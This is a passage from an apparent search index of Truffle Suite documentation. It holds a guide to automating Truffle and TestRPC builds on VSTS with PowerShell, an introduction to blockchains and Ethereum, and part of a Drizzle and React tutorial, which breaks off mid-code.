paths $ENV:Path = $ENV:Path + \u201c ; \u201d + $env:npm_path # retrieve the PID and kill the entire processs tree cat testrpcPID . xml $testrpcPID = Import-CliXml testrpcPID . xml taskkill / pid $testrpcPID / F / T Add a new Publish test result Test Result Format: JUnit Test Result Files: junitresults.xml Future work \u00b6 Things that I would like to add in the future: Figure out how to automate this on a Linux build agent (VSTS supports both Windows & Linux based build agents) Automate Release Management to run truffle migrate to push to a Bletchley test environment","title":"Truffle Suite"},{"location":"guides/ethereum-devops-truffle-testrpc-vsts/index.html#the-build-system","text":"The system uses the Visual Studio Team Services (VSTS) build engine to automate this. You can sign up for free, and get unlimited private Git repos. You can have the code hosted on any Git provider. So either within VSTS itself, or GitHub, BitBucket, etc.","title":"The Build system"},{"location":"guides/ethereum-devops-truffle-testrpc-vsts/index.html#prepare-trufflejs","text":"A pre-step is to define the test section in the truffle.js file mocha : { reporter : \u201c spec \u201d , reporterOptions : { mochaFile : \u2018 junitresults . xml \u2019 } }","title":"Prepare truffle.js"},{"location":"guides/ethereum-devops-truffle-testrpc-vsts/index.html#create-a-build-agent","text":"VSTS does provide hosted build agents, which are generic and can build standard .Net projects, Xamarin, etc. But because we are going to use npm packages installed globally on the box to handle the Truffle builds Create a new Windows VM (Can be your own hosted server, or Azure). e.g. Windows Server 2016 Datacentre edition on Azure Install the VSTS build agent. Instructions at https://www.visualstudio.com/en-us/docs/build/admin/agents/v2-windows Note: DON\u2019T select to run service as NT AUTHORITY\\NETWORK, this will not work with TestRPC (needs to open ports). Run the service as another user, or NT AUTHORITY\\SYSTEM Install chocolatey https://chocolatey.org/install Install these chocolatey packages $ choco install git -y $ choco install nodejs.install \u2013y Install npm packages (make sure you open a new PowerShell window so that node is in your path) $ npm install -g npm $ npm install -g \u2013production windows-build-tools $ npm install -g ethereumjs-testrpc $ npm install -g truffle $ npm install -g mocha $ npm install -g mocha-junit-reporter Restart the build agent so that all new paths are working","title":"Create a build agent"},{"location":"guides/ethereum-devops-truffle-testrpc-vsts/index.html#configure-vsts-build","text":"Create a new variable with the path to where the npm global path is, for the user you installed the npm packages on above: variable name: npm.path variable value: path to npm packages e.g. C:\\Users\\<user>\\AppData\\Roaming\\npm","title":"Configure VSTS build"},{"location":"guides/ethereum-devops-truffle-testrpc-vsts/index.html#add-7-powershell-tasks-and-configure-them-like-this","text":"Name: System version information Script: #Setting environment paths $ENV:Path = $ENV:Path + \u201c ; \u201d + $env:npm_path npm config set prefix $env:npm_path #only needs to be set once, will update for user #DEBUG #$env:path #npm list -g \u2013depth=0 #Display system information Write-Host \u201c System version information \u201d Write-Host -nonewline \u201c node version : \u201d ; node -v Write-Host -nonewline \u201c npm version : \u201c ; npm -v Write-Host -nonewline \u201c npm prefix : \u201c ; npm prefix -g Write-Host -nonewline \u201c truffle : \u201d ; truffle version Name: Config transform & test clean Script: # remove old test results rm .\\ junitresults . xml -ea SilentlyContinue # Modify the Truffle test runner to use the JUnit reporter Rename-Item .\\ truffle . js .\\ truffle_temp . js cat .\\ truffle_temp . js | % { $_ -replace \u2018 reporter : \u201c spec \u201d\u2018 , \u2018 reporter : \u201c mocha-junit-reporter \u201d\u2018 } | Out-File -Encoding ASCII .\\ truffle . js rm .\\ truffle_temp . js Name: Truffle build Script: #Setting environment paths $ENV:Path = $ENV:Path + \u201c ; \u201d + $env:npm_path #Truffle build truffle compile Name: Launch TestRPC Script: #Setting environment paths $ENV:Path = $ENV:Path + \u201c ; \u201d + $env:npm_path # launch the process echo \u201c launching TestRPC \u201d $testrpcProcess = Start-Process testrpc -passthru # persist the PID to disk and display in logs $testrpcProcess . Id | Export-CliXml testrpcPID . xml cat testrpcPID . xml Name: Run Truffle tests Script: #Setting environment paths $ENV:Path = $ENV:Path + \u201c ; \u201d + $env:npm_path # Run the tests truffle test Name: Shutdown TestRPC Other Settings: Enable \u201cAlways Run\u201d (to make sure it is shutdown if there is an error) Script: #Setting environment paths $ENV:Path = $ENV:Path + \u201c ; \u201d + $env:npm_path # retrieve the PID and kill the entire processs tree cat testrpcPID . xml $testrpcPID = Import-CliXml testrpcPID . xml taskkill / pid $testrpcPID / F / T Add a new Publish test result Test Result Format: JUnit Test Result Files: junitresults.xml","title":"Add 7 PowerShell tasks, and configure them like this"},{"location":"guides/ethereum-devops-truffle-testrpc-vsts/index.html#future-work","text":"Things that I would like to add in the future: Figure out how to automate this on a Linux build agent (VSTS supports both Windows & Linux based build agents) Automate Release Management to run truffle migrate to push to a Bletchley test environment","title":"Future work"},{"location":"guides/ethereum-overview/index.html","text":"You may have heard the terms \"blockchain\" and \"smart contract\" floating around, but what do they actually mean? In this tutorial, we'll demystify the jargon, show you practical blockchain solutions, and give you direction on how to create an application that takes advantage of the blockchain. This is a high-level overview covering: Blockchain basics Why use a blockchain? What is a blockchain? How a blockchain works The Ethereum blockchain What is Ethereum? What is a smart contract? Ethereum networks Distributed applications (dapps) Why use a blockchain? \u00b6 Blockchains are used when multiple parties, perhaps located across the world, need to share data and transfer value without trusting each other. The financial world describes this trust as the counterparty risk : the risk that the other party won't hold up their end of the bargain. Blockchains completely remove the counterparty risk through a revolutionary system of mathematics, cryptography, and peer-to-peer networking. Before we go into those details, let's first look at some history and how the need for blockchains arose. The first databases \u00b6 In the 1960's the first computerized databases emerged. With hardware occupying multiple rooms and the Internet decades away, data naturally existed in central, physical locations. This is a centralized approach, meaning the location and accessing of data is controlled by a central authority. Centralized systems can be manipulated, from inside or outside, so we have to trust the owners of these systems to have sufficient will and resources to keep their data secure and with integrity. Centralized databases are still the most common today, powering most of our online and offline applications. A self-hosted blog is a common example of a centralized database. The owner could potentially edit posts in hindsight or censor users without recourse. Alternately, a hacker could infiltrate the server and commit malicious acts. If there is no database backup, reversing the damage might be impossible. The need to share data \u00b6 Sharing large amounts of data can be expensive and cumbersome. We can ease this burden by distributing data across multiple parties. Reading and writing are controlled by one or more parties within the group and therefore subject to similar corruptions as centralized databases. Modern shared databases use techniques to minimize this corruption. Some of these overlap with blockchains. Depending on the shared database system, it may feature: Immutability : Rather than overwriting old data, a new copy is created with the old data retained as a historical record. This record can be accessed to prove a piece of data existed at a certain time. Consensus : For a database to be shared, all parties must agree on its contents. There are various methods of reaching consensus, one of which (proof-of-work) will be discussed below. Blockchains use these and take them a step further, solving the problem of trust. What is a blockchain? \u00b6 Fundamentally, a blockchain is a shared database , consisting of a ledger of transactions. Much like a bank, the ledgers of simple blockchains keep track of currency (in this case, cryptocurrency) ownership. Unlike a centralized bank, everyone has a copy of the ledger and can verify each other's accounts. Each connected device with a copy of the ledger is called a \"node\". Blockchains eliminate the problem of trust that affect other databases in the following ways: Full decentralization : Reading/writing to the database is completely decentralized and secure. No single person or group controls a blockchain. Extreme fault tolerance : Fault tolerance is the ability of a system to handle corrupt data. While fault tolerance is not unique to blockchains, it takes the concept to its logical extreme by having every account sharing the database validate its changes. Independent verification : Transactions can be verified by anyone, without a third party. This is sometimes referred to as \"disintermediation\". How a blockchain works \u00b6 Now that we have some idea of why blockchains are useful, let's dive deeper into how they work. Interactions between accounts in a blockchain network are called \"transactions\". They can be monetary transactions, such as sending ether, the cryptocurrency used in Ethereum . They could also be transmissions of data, such as a comment or user name. A bundle of transactions is called a \"block\". Every account on the blockchain has a unique signature, which lets everyone know which account initiated the transaction. On a public blockchain, anyone can read or write data. Reading data is free, but writing to the public blockchain is not. This cost, known as \"gas\" and priced in ether, helps discourage spam and pays to secure the network. Mining \u00b6 Any node on the network can take part in securing the network through a process called \"mining\". Nodes which have opted to be miners compete to solve math problems which secure the contents of a block. Since mining requires computing power (not to mention electricity cost), miners can be compensated for their service. The winner of the competition receives some cryptocurrency as a reward. This incentivizes nodes to work to secure the network, preventing too much power from being in the hands of any single miner. Hashing \u00b6 Once a new block is mined, the other miners are notified and begin verifying and adding this new block to their copies of the chain. This is done through cryptographic hashing (or simply, \"hashing\"). Hashing is a one-way process which takes in data and gives back a fixed-length string representing that data. While the original data can't be reproduced from its hash, the same data will always produce the same hash. Therefore, unverified data can be hashed with the same function and compared to the original. If they are identical, the data is validated. Once more than half of the miners have validated the new block, the network has \"reached consensus\" and the block becomes part of the blockchain permanent history. Now this data can be downloaded by all nodes, with its validity assured. Here's the whole process visually: What is Ethereum? \u00b6 Ethereum is a blockchain that allows you to run programs in its trusted environment. This contrasts with the Bitcoin blockchain, which only allows you to manage cryptocurrency. To this end, Ethereum has a virtual machine, called the Ethereum Virtual Machine (EVM). The EVM allows code to be verified and executed on the blockchain, providing guarantees it will be run the same way on everyone's machine. This code is contained in \"smart contracts\" (more on these below). Beyond just tracking account balances, Ethereum maintains the state of the EVM on the blockchain. All nodes process smart contracts to verify the integrity of the contracts and their outputs. What is a smart contract? \u00b6 A smart contract is code that runs on the EVM. Smart contracts can accept and store ether, data, or a combination of both. Then, using the logic programmed into the contract, it can distribute that ether to other accounts or even other smart contracts. Here's a smart contract example with Bob and Alice again. Alice wants to hire Bob to build her a patio, and they are using an escrow contract (a place to store money until a condition is fulfilled) to store their ether before the final transaction. (Provisions could be written into the contract code releasing Bob's collateral to Alice if Bob were to fail to build the patio or if he were to perform a poor job.) Smart contracts are written in a language called Solidity . Solidity is statically typed, and supports inheritance, libraries, and complex user-defined types, among much else. Solidity syntax is similar to JavaScript. Ethereum networks \u00b6 Up to this point we've been describing the main Ethereum public blockchain (or \"MainNet\"). On the MainNet, data on the chain\u2014including account balances and transactions\u2014are public, and anyone can create a node and begin verifying transactions. Ether on this network has a market value and can be exchanged for other cryptocurrency or fiat currencies like US Dollars. But there are other networks as well. In fact, anyone can create their own Ethereum network. Local test networks \u00b6 The Ethereum blockchain can be simulated locally for development. Local test networks process transactions instantly and Ether can be distributed as desired. An array of Ethereum simulators exist; we recommend Ganache . Public test networks \u00b6 Developers use public test networks (or testnets) to test Ethereum applications before final deployment to the main network. Ether on these networks is used for testing purposes only and has no value. There are three public test networks in wide usage: Ropsten : The official test network, created by The Ethereum Foundation . Its functionality is similar to the MainNet. Kovan : A network that uses a consensus method called \"proof-of-authority\". This means its transactions are validated by select members, leading to a consistent four second block time. The supply of ether on this testnet is also controlled to mitigate spam attacks. Rinkeby : A testnet also using proof-of-authority, created by The Ethereum Foundation. Private/enterprise networks \u00b6 Private Ethereum networks allow parties to share data without making it publicly accessible. A private blockchain is a good choice for: Sharing of sensitive data, such as health care records Scaling to handle higher read/write throughput, due to the smaller network size An example of a private enterprise blockchain is Quorum , originally written by J.P. Morgan. ( Read our blog post on using Truffle with Quorum. ) Decentralized applications (dapps) \u00b6 Applications using smart contracts for their processing and/or datastorage are called \"decentralized applications\", or \"dapps\". The user interfaces for these dapps consist of familiar languages such as HTML, CSS, and JavaScript. The application itself can be hosted on a traditional web server or on a decentralized file service such as Swarm or IPFS . Given the benefits of the Ethereum blockchain, a dapp could be a solution for many industries, including but not limited to: Record keeping Finance Supply chains Real estate Marketplaces And what is the best way to create your own dapp, test it, and deploy it to an Ethereum network of your choice? With Truffle , of course.","title":"Ethereum Overview"},{"location":"guides/ethereum-overview/index.html#why-use-a-blockchain","text":"Blockchains are used when multiple parties, perhaps located across the world, need to share data and transfer value without trusting each other. The financial world describes this trust as the counterparty risk : the risk that the other party won't hold up their end of the bargain. Blockchains completely remove the counterparty risk through a revolutionary system of mathematics, cryptography, and peer-to-peer networking. Before we go into those details, let's first look at some history and how the need for blockchains arose.","title":"Why use a blockchain?"},{"location":"guides/ethereum-overview/index.html#the-first-databases","text":"In the 1960's the first computerized databases emerged. With hardware occupying multiple rooms and the Internet decades away, data naturally existed in central, physical locations. This is a centralized approach, meaning the location and accessing of data is controlled by a central authority. Centralized systems can be manipulated, from inside or outside, so we have to trust the owners of these systems to have sufficient will and resources to keep their data secure and with integrity. Centralized databases are still the most common today, powering most of our online and offline applications. A self-hosted blog is a common example of a centralized database. The owner could potentially edit posts in hindsight or censor users without recourse. Alternately, a hacker could infiltrate the server and commit malicious acts. If there is no database backup, reversing the damage might be impossible.","title":"The first databases"},{"location":"guides/ethereum-overview/index.html#the-need-to-share-data","text":"Sharing large amounts of data can be expensive and cumbersome. We can ease this burden by distributing data across multiple parties. Reading and writing are controlled by one or more parties within the group and therefore subject to similar corruptions as centralized databases. Modern shared databases use techniques to minimize this corruption. Some of these overlap with blockchains. Depending on the shared database system, it may feature: Immutability : Rather than overwriting old data, a new copy is created with the old data retained as a historical record. This record can be accessed to prove a piece of data existed at a certain time. Consensus : For a database to be shared, all parties must agree on its contents. There are various methods of reaching consensus, one of which (proof-of-work) will be discussed below. Blockchains use these and take them a step further, solving the problem of trust.","title":"The need to share data"},{"location":"guides/ethereum-overview/index.html#what-is-a-blockchain","text":"Fundamentally, a blockchain is a shared database , consisting of a ledger of transactions. Much like a bank, the ledgers of simple blockchains keep track of currency (in this case, cryptocurrency) ownership. Unlike a centralized bank, everyone has a copy of the ledger and can verify each other's accounts. Each connected device with a copy of the ledger is called a \"node\". Blockchains eliminate the problem of trust that affect other databases in the following ways: Full decentralization : Reading/writing to the database is completely decentralized and secure. No single person or group controls a blockchain. Extreme fault tolerance : Fault tolerance is the ability of a system to handle corrupt data. While fault tolerance is not unique to blockchains, it takes the concept to its logical extreme by having every account sharing the database validate its changes. Independent verification : Transactions can be verified by anyone, without a third party. This is sometimes referred to as \"disintermediation\".","title":"What is a blockchain?"},{"location":"guides/ethereum-overview/index.html#how-a-blockchain-works","text":"Now that we have some idea of why blockchains are useful, let's dive deeper into how they work. Interactions between accounts in a blockchain network are called \"transactions\". They can be monetary transactions, such as sending ether, the cryptocurrency used in Ethereum . They could also be transmissions of data, such as a comment or user name. A bundle of transactions is called a \"block\". Every account on the blockchain has a unique signature, which lets everyone know which account initiated the transaction. On a public blockchain, anyone can read or write data. Reading data is free, but writing to the public blockchain is not. This cost, known as \"gas\" and priced in ether, helps discourage spam and pays to secure the network.","title":"How a blockchain works"},{"location":"guides/ethereum-overview/index.html#mining","text":"Any node on the network can take part in securing the network through a process called \"mining\". Nodes which have opted to be miners compete to solve math problems which secure the contents of a block. Since mining requires computing power (not to mention electricity cost), miners can be compensated for their service. The winner of the competition receives some cryptocurrency as a reward. This incentivizes nodes to work to secure the network, preventing too much power from being in the hands of any single miner.","title":"Mining"},{"location":"guides/ethereum-overview/index.html#hashing","text":"Once a new block is mined, the other miners are notified and begin verifying and adding this new block to their copies of the chain. This is done through cryptographic hashing (or simply, \"hashing\"). Hashing is a one-way process which takes in data and gives back a fixed-length string representing that data. While the original data can't be reproduced from its hash, the same data will always produce the same hash. Therefore, unverified data can be hashed with the same function and compared to the original. If they are identical, the data is validated. Once more than half of the miners have validated the new block, the network has \"reached consensus\" and the block becomes part of the blockchain permanent history. Now this data can be downloaded by all nodes, with its validity assured. Here's the whole process visually:","title":"Hashing"},{"location":"guides/ethereum-overview/index.html#what-is-ethereum","text":"Ethereum is a blockchain that allows you to run programs in its trusted environment. This contrasts with the Bitcoin blockchain, which only allows you to manage cryptocurrency. To this end, Ethereum has a virtual machine, called the Ethereum Virtual Machine (EVM). The EVM allows code to be verified and executed on the blockchain, providing guarantees it will be run the same way on everyone's machine. This code is contained in \"smart contracts\" (more on these below). Beyond just tracking account balances, Ethereum maintains the state of the EVM on the blockchain. All nodes process smart contracts to verify the integrity of the contracts and their outputs.","title":"What is Ethereum?"},{"location":"guides/ethereum-overview/index.html#what-is-a-smart-contract","text":"A smart contract is code that runs on the EVM. Smart contracts can accept and store ether, data, or a combination of both. Then, using the logic programmed into the contract, it can distribute that ether to other accounts or even other smart contracts. Here's a smart contract example with Bob and Alice again. Alice wants to hire Bob to build her a patio, and they are using an escrow contract (a place to store money until a condition is fulfilled) to store their ether before the final transaction. (Provisions could be written into the contract code releasing Bob's collateral to Alice if Bob were to fail to build the patio or if he were to perform a poor job.) Smart contracts are written in a language called Solidity . Solidity is statically typed, and supports inheritance, libraries, and complex user-defined types, among much else. Solidity syntax is similar to JavaScript.","title":"What is a smart contract?"},{"location":"guides/ethereum-overview/index.html#ethereum-networks","text":"Up to this point we've been describing the main Ethereum public blockchain (or \"MainNet\"). On the MainNet, data on the chain\u2014including account balances and transactions\u2014are public, and anyone can create a node and begin verifying transactions. Ether on this network has a market value and can be exchanged for other cryptocurrency or fiat currencies like US Dollars. But there are other networks as well. In fact, anyone can create their own Ethereum network.","title":"Ethereum networks"},{"location":"guides/ethereum-overview/index.html#local-test-networks","text":"The Ethereum blockchain can be simulated locally for development. Local test networks process transactions instantly and Ether can be distributed as desired. An array of Ethereum simulators exist; we recommend Ganache .","title":"Local test networks"},{"location":"guides/ethereum-overview/index.html#public-test-networks","text":"Developers use public test networks (or testnets) to test Ethereum applications before final deployment to the main network. Ether on these networks is used for testing purposes only and has no value. There are three public test networks in wide usage: Ropsten : The official test network, created by The Ethereum Foundation . Its functionality is similar to the MainNet. Kovan : A network that uses a consensus method called \"proof-of-authority\". This means its transactions are validated by select members, leading to a consistent four second block time. The supply of ether on this testnet is also controlled to mitigate spam attacks. Rinkeby : A testnet also using proof-of-authority, created by The Ethereum Foundation.","title":"Public test networks"},{"location":"guides/ethereum-overview/index.html#privateenterprise-networks","text":"Private Ethereum networks allow parties to share data without making it publicly accessible. A private blockchain is a good choice for: Sharing of sensitive data, such as health care records Scaling to handle higher read/write throughput, due to the smaller network size An example of a private enterprise blockchain is Quorum , originally written by J.P. Morgan. ( Read our blog post on using Truffle with Quorum. )","title":"Private/enterprise networks"},{"location":"guides/ethereum-overview/index.html#decentralized-applications-dapps","text":"Applications using smart contracts for their processing and/or datastorage are called \"decentralized applications\", or \"dapps\". The user interfaces for these dapps consist of familiar languages such as HTML, CSS, and JavaScript. The application itself can be hosted on a traditional web server or on a decentralized file service such as Swarm or IPFS . Given the benefits of the Ethereum blockchain, a dapp could be a solution for many industries, including but not limited to: Record keeping Finance Supply chains Real estate Marketplaces And what is the best way to create your own dapp, test it, and deploy it to an Ethereum network of your choice? With Truffle , of course.","title":"Decentralized applications (dapps)"},{"location":"guides/getting-started-with-drizzle-and-react/index.html","text":"Getting Started with Drizzle and React \u00b6 Drizzle is the newest member of the Truffle Suite and our first front-end development tool. At its core, Drizzle takes care of synchronizing your contract data, transaction data and more from the blockchain to a Redux store. There are also higher-level abstractions on top of the base drizzle library; tools for React compatibility ( drizzle-react ) and a set of ready-to-use React components ( drizzle-react-components ). We're going to focus on the lower levels today, taking you through setting up a Truffle project with React and Drizzle from scratch. This way we can gain the best understanding of how Drizzle works under the hood. With this knowledge, you can leverage the full power of Drizzle with any front-end framework of your choosing, or use the higher-level React abstractions with confidence. This will be a very minimal tutorial focused on setting and getting a simple string stored in a contract. It's meant for those with a basic knowledge of Truffle, who have some knowledge of JavaScript and React.js, but who are new to using Drizzle. Note : For Truffle basics, please read through the Truffle Pet Shop tutorial before proceeding. In this tutorial we will be covering: Setting up the development environment Creating a Truffle project from scratch Writing the smart contract Compiling and migrating the smart contract Testing the smart contract Creating our React.js project Wiring up the front-end client Wire up the React app with Drizzle Write a component to read from Drizzle Write a component to write to the smart contract Setting up the development environment \u00b6 There are a few technical requirements before we start. Please install the following: Node.js v8+ LTS and npm (comes with Node) Truffle \u00b6 Once we have those installed, we only need one command to install Truffle: npm install -g truffle To verify that Truffle is installed properly, type truffle version on a terminal. If you see an error, make sure that your npm modules are added to your path. Create-React-App \u00b6 Finally, since this is a React.js tutorial, we will be creating our React project with Create-React-App . You won't have to do anything if you have NPM version 5.2 or above. You can check your NPM version by running npm --version . If you do not, then you will need to install the tool globally with this command: npm install -g create-react-app Creating a Truffle project \u00b6 Truffle initializes in the current directory, so first create a directory in your development folder of choice and then move inside it. mkdir drizzle-react-tutorial cd drizzle-react-tutorial Now we're ready to spawn our empty Truffle project by running the following command: truffle init Let's take a brief look at the directory structure that was just generated. Directory structure \u00b6 The default Truffle directory structure contains the following: contracts/ : Contains the Solidity source files for our smart contracts. There is an important contract in here called Migrations.sol , which we'll talk about later. migrations/ : Truffle uses a migration system to handle smart contract deployments. A migration is an additional special smart contract that keeps track of changes. test/ : Contains both JavaScript and Solidity tests for our smart contracts. truffle-config.js : Truffle configuration file. Writing our smart contract \u00b6 We'll add a simple smart contract called MyStringStore. Create a new file named MyStringStore.sol in the contracts/ directory. Add the following content to the file: pragma solidity ^ 0.5.0 ; contract MyStringStore { string public myString = \"Hello World\" ; function set ( string memory x ) public { myString = x ; } } Since this isn't a Solidity tutorial, all you need to know about this is: We've created a public string variable named myString and initialized it to \"Hello World\". This automatically creates a getter (since it's a public variable) so we don't have to write one ourselves. We've created a setter method that simply sets the myString variable with whatever string is passed in. Launching a test blockchain with Truffle Develop \u00b6 Before we move ahead, let's first launch our test blockchain with the Truffle Develop console. Open up a new terminal, navigate to the project directory, and run the following command: truffle develop This will spawn a new blockchain that listens on 127.0.0.1:9545 by default. Compiling and migrating the smart contract \u00b6 Now we are ready to compile and migrate our contract. Compilation \u00b6 In the Truffle Develop console, type the following command: compile Note : If you're on Windows and encountering problems running this command, please see the documentation on [resolving naming conflicts on Windows](/docs/advanced/configuration#resolving-naming-conflicts-on-windows). You should see output similar to the following: Compiling ./contracts/Migrations.sol... Compiling ./contracts/MyStringStore.sol... Writing artifacts to ./build/contracts Migration \u00b6 Now that we've successfully compiled our contracts, it's time to migrate them to the blockchain! Note : Read more about migrations in the [Truffle documentation](/docs/getting_started/migrations). To create our own migration script. Create a new file named 2_deploy_contracts.js in the migrations/ directory. Add the following content to the 2_deploy_contracts.js file: const MyStringStore = artifacts . require ( \"MyStringStore\" ); module . exports = function ( deployer ) { deployer . deploy ( MyStringStore ); }; Back in our Truffle Develop console, migrate the contract to the blockchain. migrate You should see the migrations being executed in order, with the details of each migration listed. Testing the smart contract \u00b6 Before we proceed, we should write a couple tests to ensure that our contract works as expected. Create a new file named MyStringStore.js in the test/ directory. Add the following content to the MyStringStore.js file: const MyStringStore = artifacts . require ( \"./MyStringStore.sol\" ); contract ( \"MyStringStore\" , accounts => { it ( \"should store the string 'Hey there!'\" , async () => { const myStringStore = await MyStringStore . deployed (); // Set myString to \"Hey there!\" await myStringStore . set ( \"Hey there!\" , { from : accounts [ 0 ] }); // Get myString from public variable getter const storedString = await myStringStore . myString . call (); assert . equal ( storedString , \"Hey there!\" , \"The string was not stored\" ); }); }); Running the tests \u00b6 Back in the Truffle Develop console, run the tests: test If all the tests pass, you'll see console output similar to this: Using network 'develop'. Contract: MyStringStore \u2713 should store the string 'Hey there!' (98ms) 1 passing (116ms) Awesome! Now we know that the contract actually works. Creating our React.js project \u00b6 Now that we are done with the smart contract, we can write our front-end client with React.js! In order to do this, open another terminal, navigate to your project directory, and simply run this command (if you have NPM version 5.2 or above): npx create-react-app client If you have an older version of NPM , make sure Create-React-App is installed globally as per the instructions in the Setting up the development environment section and then run the following: create-react-app client This should create a client directory in your Truffle project and bootstrap a barebones React.js project for you to start building your front-end with. Wiring up the front-end client \u00b6 Since Create-React-App's default behavior disallows importing files from outside of the src folder, we need to bring the contracts in our build folder inside src . We can copy and paste them every time we compile our contracts, but a better way is to simply configure Truffle to put the files there. In the truffle-config.js file, replace the contents with the following: const path = require ( \"path\" ); module . exports = { contracts_build_directory : path . join ( __dirname , \"client/src/contracts\" ) }; This will make sure to output the contract build artifacts directory inside your React project. But this also means we'll have to restart our Truffle Develop console. Press CTRL + C to exit out of the Truffle Develop console and then start it again with truffle develop . From there, make sure you run the compile and migrate commands again so that the new build artifacts will be output into the new folder. If you are encountering issues, try migrate --reset for a clean migration from scratch. Install Drizzle \u00b6 This is the most delicious part, we install Drizzle. Make sure you are in the client directory and then run the following: npm install @drizzle/store And that's it for dependencies! Note that we don't need to install Web3.js or @truffle/contract ourselves. Drizzle contains everything we need to work reactively with our smart contracts. Wire up the React app with Drizzle \u00b6 Before we go further, let's start our React app by running the follow command inside our client directory: npm start This will serve the front-end under localhost:3000 , so open that up in your browser. Note : Make sure to use an incognito window if you already have MetaMask installed (or disable MetaMask for now). Otherwise, the app will try to use the network specified in MetaMask rather than the develop network under `localhost:9545`. If the default Create-React-App page loaded without any issues, you may proceed. Setup the store \u00b6 The first thing we need to do is to setup and instantiate the Drizzle store. We are going add the following code to client/src/index.js : // import drizzle functions and contract artifact import { Drizzle } from \"@drizzle/store\" ; import MyStringStore from \"./contracts/MyStringStore.json\" ; // let drizzle know what contracts we want and how to access our test blockchain const options = { contracts : [ MyStringStore ], web3 : { fallback : { type : \"ws\" , url : \"ws://127.0.0.1:9545\" , }, }, }; // setup drizzle const drizzle = new Drizzle ( options ); First, we imported the tools from Drizzle as well as the contract definition. We then built our options object for Drizzle, which in this case is just specifying the specific contract we want to be loaded by passing in the JSON build artifact. And finally, we created the drizzleStore and used that to create our drizzle instance which we will pass in as a prop to our App component. Once that is complete, your index.js should look something like this: import React from 'react' ; import ReactDOM from 'react-dom' ; import './index.css' ; import App from './App' ; import * as serviceWorker from './serviceWorker' ; // import drizzle functions and contract artifact import { Drizzle , generateStore } from \"@drizzle/store\" ; import MyStringStore from \"./contracts/MyStringStore.json\" ; // let drizzle know what contracts we want and how to access our test blockchain const options = { contracts : [ MyStringStore ], web3 : { fallback : { type : \"ws\" , url : \"ws://127.0.0.1:9545\" , }, }, }; // setup the drizzle store and drizzle const drizzle = new Drizzle ( options ); ReactDOM . render ( < App drizzle = { drizzle } /> , document . getElementById ( 'root' )); Note again that the drizzle instance is passed into the App component as props. Wire up the App component \u00b6 Now that we have a drizzle instance to play around with, we can go into client/src/App.js to start working with the React API. Adding state variables \u00b6 First thing we will do is to add the following line inside our App component: state = { loading : true , drizzleState : null }; We are going to be using two state variables here: loading \u2014 Indicates if Drizzle has finished initializing and the app is ready. The initialization process includes instantiating web3 and our smart contracts, fetching any available Ethereum accounts and listening (or, in cases where subscriptions are not supported: polling) for new blocks. drizzleState \u2014 This is where we will store the state of the Drizzle store in our top-level component. If we can keep this state variable up-to-date, then we can simply use simple props and state to work with Drizzle (i.e. you don't have to use any Redux or advanced React patterns). Adding some initialization logic \u00b6 Next we will add in our componentDidMount method into the component class so that we can run some initialization logic. componentDidMount () { const { drizzle } = this . props ; // subscribe to changes in the store this . unsubscribe = drizzle . store . subscribe (() => { // every time the store updates, grab the state from drizzle const drizzleState = drizzle . store . getState (); // check to see if it's ready, if so, update local component state if ( drizzleState . drizzleStatus . initialized ) { this . setState ({ loading : false , drizzleState }); } }); } First, we grab the drizzle instance from the props, then we call drizzle.store.subscribe and pass in a callback function. This callback function is called whenever the Drizzle store is updated. Note that this store is actually a Redux store under the hood, so this might look familiar if you've used Redux previously. Whenever the store is updated, we will try to grab the state with drizzle.store.getState() and then if Drizzle is initialized and ready, we will set loading to false, and also update the drizzleState state variable. By doing this, drizzleState will always be up-to-date and we also know exactly when Drizzle is ready so we can use a loading component to let the user know. Unsubscribing from the store \u00b6 Note that we assign the return value of the subscribe() to a class variable this.unsubscribe . This is because it is always good practice to unsubscribe from any subscriptions you have when the component un-mounts. In order to do this, we save a reference to that subscription (i.e. this.unsubscribe ), and inside componentWillUnmount , we have the following: componentWillUnmount () { this . unsubscribe (); } This will safely unsubscribe when the App component un-mounts so we can prevent any memory leaks. Replace the render method \u00b6 Finally, we can replace the boilerplate render method with something that applies to us better: render () { if ( this . state . loading ) return \"Loading Drizzle...\" ; return < div className = \"App\" > Drizzle is ready < /div>; } In the next section, we will replace \"Drizzle is ready\" with an actual component that will read from the store. If you refresh your browser and run this app now, you should see \"Loading Drizzle...\" briefly flash on screen and then subsequently \"Drizzle is ready\". Full component code \u00b6 When you are done this section, your App component should look like the following: class App extends Component { state = { loading : true , drizzleState : null }; componentDidMount () { const { drizzle } = this . props ; // subscribe to changes in the store this . unsubscribe = drizzle . store . subscribe (() => { // every time the store updates, grab the state from drizzle const drizzleState = drizzle . store . getState (); // check to see if it's ready, if so, update local component state if ( drizzleState . drizzleStatus . initialized ) { this . setState ({ loading : false , drizzleState }); } }); } componentWillUnmount () { this . unsubscribe (); } render () { if ( this . state . loading ) return \"Loading Drizzle...\" ; return < div className = \"App\" > Drizzle is ready < /div>; } } Write a component to read from Drizzle \u00b6 First, let's create a new file at client/src/ReadString.js and paste in the following: import React from \"react\" ; class ReadString extends React . Component { componentDidMount () { const { drizzle , drizzleState } = this . props ; console . log ( drizzle ); console . log ( drizzleState ); } render () { return < div > ReadString Component < /div>; } } export default ReadString ; And then inside App.js , import the new component with this statement: import ReadString from \"./ReadString\" ; Now modify your App.js render method so that we pass in the drizzle instance from props as well as the drizzleState from the component state: render () { if ( this . state . loading ) return \"Loading Drizzle...\" ; return ( < div className = \"App\" > < ReadString drizzle = { this . props . drizzle } drizzleState = { this . state . drizzleState } /> < /div> ); } Go back to the browser and open up your console. You should see that the two console.log statements are working and they are displaying both the drizzle instance as well as a drizzleState that is fully initialized. What this tells us is that the drizzleState we get in this component will always be fully ready once this component mounts. At this point, you can take some time to explore the drizzle instance object as well as the drizzleState object. drizzle instance and drizzleState \u00b6 For the most part, drizzleState is there for you to read information from (i.e. contract state variables, return values, transaction status, account data, etc.), whereas the drizzle instance is what you will use to actually get stuff done (i.e. call contract methods, the Web3 instance, etc.). Wiring up the ReadString component \u00b6 Now that we have access to our drizzle instance and the drizzleState , we can put in the logic that allows us read the smart contract variable we are interested in. Here is what the full code of ReadString.js should look like: import React from \"react\" ; class ReadString extends React . Component { state = { dataKey : null }; componentDidMount () { const { drizzle } = this . props ; const contract = drizzle . contracts . MyStringStore ; // let drizzle know we want to watch the `myString` method const dataKey = contract . methods [ \"myString\" ]. cacheCall (); // save the `dataKey` to local component state for later reference this . setState ({ dataKey }); } render () { // get the contract state from drizzleState const { MyStringStore } = this . props . drizzleState . contracts ; // using the saved `dataKey`, get the variable we're interested in const myString = MyStringStore . myString [ this . state . dataKey ]; // if it exists, then we display its value return < p > My stored string : { myString && myString . value } < /p>; 